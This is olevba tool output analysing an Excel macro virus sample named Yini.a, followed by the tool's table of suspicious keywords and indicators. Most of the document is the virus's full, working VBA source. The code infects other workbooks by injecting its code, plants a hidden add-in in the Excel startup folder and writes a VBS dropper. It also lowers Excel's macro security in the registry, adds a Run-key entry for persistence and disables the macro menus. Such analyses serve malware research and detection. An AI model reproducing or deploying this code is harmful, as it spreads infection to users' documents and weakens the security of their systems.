olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Yini.a-a217fb56ba17ebc4e2f131fb97afc5079a835c89
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Yini.a-a217fb56ba17ebc4e2f131fb97afc5079a835c89 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Option Explicit
Private WithEvents App As Application
Attribute App.VB_VarHelpID = -1





Private Const Darling As String = "hhh.xls"
Private Const StartLove As String = "hhh.vbs"
Private Const MYTEXT As String = "c:\windows\system\hhh"
Private Sub Workbook_Open()
  Dim DarlingPath As String
  Dim StartPath As String
  Dim DarlingBook As Workbook
  Dim Fullpath As String
  Dim ExistFlag
  'MsgBox 123
  On Error Resume Next
  Call Hide
  Call CreateFile
  StartPath = Application.StartupPath
  Fullpath = UCase$(StartPath + "\" + Darling)
  ExistFlag = Len(Dir$(Fullpath))
  
  If UCase$(Me.FullName) = Fullpath Then
    Set App = Application
  ElseIf (ExistFlag = 0) Then
    Application.ScreenUpdating = False
    If Len(Dir(StartPath, vbDirectory)) = 0 Then
       MkDir StartPath
    End If
    Set DarlingBook = Application.Workbooks.Add
    DarlingBook.IsAddin = True
    HurtWbk DarlingBook
    'DarlingBook.SaveAs Fullpath, xlNormal
    DarlingBook.SaveAs Fullpath, xlAddIn
    DarlingBook.Close
    Application.ScreenUpdating = True
  Else
  End If
End Sub
Private Sub App_WorkbookBeforeSave(ByVal Wbk As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  HurtWbk Wbk
End Sub
Private Sub App_WorkbookBeforeClose(ByVal Wbk As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wbk.Path) <> 0 Then
    If HurtWbk(Wbk) Then
      Wbk.Save
      Wbk.Saved = True
      
    End If
  End If
End Sub
Private Function HurtWbk(Wbk As Workbook) As Boolean
  Dim Source As Object
  Dim Target As Object
  Dim FindResult As Boolean
  On Error Resume Next
  HurtWbk = False
  Set Source = Me.VBProject.VBComponents("ThisWorkbook").CodeModule
  Set Target = Wbk.VBProject.VBComponents("ThisWorkbook").CodeModule
  FindResult = Wbk.VBProject.VBComponents("ThisWorkBook").CodeModule.Find("yinyin3345.xls", 1, 1, 10, 30, False, False) '查看目标文件是否已带毒
  If FindResult = False Then
    Target.DeleteLines 1, Source.CountOfLines
    Target.AddFromString Source.Lines(1, Source.CountOfLines)
    
  End If
  
End Function

Sub Hide()
  Dim Con
  Dim WshShell
  Dim Fullpath As String
  Dim Fso
  Dim File
  Set Fso = CreateObject("scripting.filesystemobject")
  Set WshShell = CreateObject("WScript.Shell")
  On Error Resume Next
  For Each File In Application.RecentFiles
     If InStr(File.Name, "yinyin3345.xls") > 0 Then
     Fso.deletefile File.Path
  
     End If
     Next File
  
  On Error Resume Next
  Fullpath = WshShell.SpecialFolders("recent") & "\yinyin~1.lnk"
  If Len(Dir$(Fullpath)) > 0 Then
    Fso.deletefile Fullpath
  End If
  Fullpath = WshShell.SpecialFolders("Templates") & "\Software\yinyin3345.vbs"
  WshShell.regwrite "HKCU\Software\Microsoft\Office\9.0\excel\Security\Level", 1, "REG_DWORD"
  WshShell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\internet.exe", Fullpath
  On Error Resume Next
  For Each Con In Application.CommandBars("tools").Controls
    If Left$(Con.Caption, 1) = "宏" Then
      Con.Enabled = False
      Exit For
    End If
  Next Con
  On Error Resume Next
  For Each Con In Application.CommandBars("macro").Controls
    Con.Enabled = False
    Con.Visible = False
  Next Con
End Sub

Sub CreateFile()
  Dim Fso, Source
  Dim Wsh
  Dim Myfolder
  Dim FileName, i, Text
  Set Fso = CreateObject("scripting.filesystemobject")
  Set Wsh = CreateObject("wscript.shell")
  Myfolder = Wsh.SpecialFolders("Templates") & "\u\"
  Set Source = Me.VBProject.VBComponents("ThisWorkbook").CodeModule
  If Not Fso.folderexists(Myfolder) Then
    Fso.createfolder Myfolder
  End If
  FileName = Myfolder & StartLove
  Open FileName For Output As #1
  'Print #1, "MsgBox 123 "

  Print #1, "Dim Fso,Wsh,Cell,myBook,MyText"
  Print #1, "Set Fso = CreateObject(" & Chr(34) & "scripting.filesystemobject"; Chr(34); ")"
  Print #1, "Set wsh = CreateObject(" & Chr(34) & "wscript.shell"; Chr(34); ")"
  Print #1, "Set cell = CreateObject(" & Chr(34) & "excel.application" & Chr(34) & ")"
  Print #1, "if Fso.fileexists(cell.StartupPath + " & Chr(34) & "\hhh.xls" & Chr(34) & ") = false then"
  Print #1, "Set Mybook = cell.Workbooks.Add"
  Print #1, "Mybook.IsAddin = True"
  Print #1, "Mybook.VBProject.VBComponents(" & Chr(34) & "ThisWorkbook" & Chr(34) & ").CodeModule.addfromfile " & Chr(34) & "c:\windows\system\hhh" & Chr(34)
  Print #1, "Mybook.SaveAs UCase(cell.StartupPath + " & Chr(34) & "\yinyin3345.xls" & Chr(34) & "), 18"
  Print #1, "Mybook.Close"
  Print #1, "Set cell = Nothing"
  Print #1, "end if"
  Print #1, "If Month(Date) = 11 And Day(Date) = 4 Then"
  Print #1, "MsgBox " & Chr(34) & "日快乐!!!!!!!!" & Chr(34) & ", vbOKOnly," & Chr(34) & "友情提示" & Chr(34)
  Print #1, "Fso.deletefile wsh.specialfolders(" & Chr(34) & "Templates" & Chr(34) & ") &  " & Chr(34) & "\software\yinyin3345.vbs" & Chr(34)
  Print #1, "elseif weekday(date)= 5 then"
  Print #1, "MsgBox " & Chr(34) & "您的电脑如果出现不能上网的问题，请和系统管理员联系。" & Chr(34) & ", vbOKOnly," & Chr(34) & "友情提示" & Chr(34)
  Print #1, "Fso.deletefile wsh.specialfolders(" & Chr(34) & "Templates" & Chr(34) & ") &  " & Chr(34) & "\software\3345.vbs" & Chr(34)
  Print #1, "else"
  Print #1, "end if"
  Print #1, "set fso = nothing"
  Print #1, "set wsh = nothing"
  Close #1
  Open MYTEXT For Output As #1
  Print #1, Source.Lines(1, Source.CountOfLines)
  Close #1
  Set Source = Nothing
End Sub



-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Yini.a-a217fb56ba17ebc4e2f131fb97afc5079a835c89 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Yini.a-a217fb56ba17ebc4e2f131fb97afc5079a835c89 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Yini.a-a217fb56ba17ebc4e2f131fb97afc5079a835c89 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |hhh.vbs             |Executable file name                         |
|IOC       |1.lnk               |Executable file name                         |
|IOC       |yinyin3345.vbs      |Executable file name                         |
|IOC       |internet.exe        |Executable file name                         |
|IOC       |3345.vbs            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

